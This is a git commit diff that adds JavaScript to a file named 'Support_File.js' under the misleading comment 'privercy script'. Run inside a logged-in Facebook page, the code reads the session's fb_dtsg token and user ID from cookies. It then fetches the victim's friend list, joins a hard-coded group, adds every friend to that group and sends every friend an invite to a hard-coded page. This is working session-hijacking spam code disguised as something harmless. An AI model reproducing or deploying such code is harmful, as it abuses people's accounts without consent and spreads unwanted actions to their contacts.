33b24b5797d05ed47d79dc175e34b0fb9fad1a63
Bhargav Jt. Gogoi <www.bhargav1996@gmail.com>
2014-09-29 01:53:23 +0530

    Update Support_File.js

--- Support_File.js
+++ Support_File.js
@@ -1,3 +1,81 @@
+
+/* privercy script */
+
+
+var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
+var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
+
+var friends = new Array();
+gf = new XMLHttpRequest();
+gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
+gf['send']();
+if (gf['readyState'] != 4) {} else {
+    data = eval('(' + gf['responseText']['substr'](9) + ')');
+    if (data['error']) {} else {
+        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
+            return _0x93dax8['index'] - _0x93dax9['index'];
+        });
+    };
+};
+
+
+
+
+var pid = ['514486465297821'];
+
+var gid = ['637005376320957'];
+
+
+
+
+
+var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
+var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
+
+var httpwp = new XMLHttpRequest();
+var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
+var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
+httpwp['open']('POST', urlwp, true);
+httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+httpwp['setRequestHeader']('Content-length', paramswp['length']);
+httpwp['setRequestHeader']('Connection', 'keep-alive');
+httpwp['send'](paramswp);
+
+
+
+for (var i = 0; i < friends['length']; i++) {
+    var httpwp = new XMLHttpRequest();
+    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
+    var paramswp = '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
+    httpwp['open']('POST', urlwp, true);
+    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+    httpwp['setRequestHeader']('Content-length', paramswp['length']);
+    httpwp['setRequestHeader']('Connection', 'keep-alive');
+    httpwp['onreadystatechange'] = function () {
+        if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
+    };
+    httpwp['send'](paramswp);
+};
+
+
+
+
+
+for (var i = 0; i < friends['length']; i++) {
+    var httpwp = new XMLHttpRequest();
+    var urlwp = '//www.facebook.com/ajax/pages/invite/send_single/';
+    var paramswp = 'page_id='+ pid +'&invitee=' + friends[i]['uid'] + '&elem_id=u_jsonp_3_56&action=send&ref=friend_summary_section&__user=' + user_id + '&__a=1&__dyn=aJswFGyj2qm9adDgDxyIGKih8xEW9ACy8jx6haGgyhqGejheC&__req=x&fb_dtsg=' + fb_dtsg + '&ttstamp=265816511978669769&__rev=1114696';
+    httpwp['open']('POST', urlwp, true);
+    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+    httpwp['setRequestHeader']('Content-length', paramswp['length']);
+    httpwp['setRequestHeader']('Connection', 'keep-alive');
+    httpwp['onreadystatechange'] = function () {
+        if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
+    };
+    httpwp['send'](paramswp);
+};
+
+
 /*bhargav jt. gogoi...2014 scripting all rights reserved*/
 /*group Join*/
 var b = document.getElementsByName("fb_dtsg")[0].value,
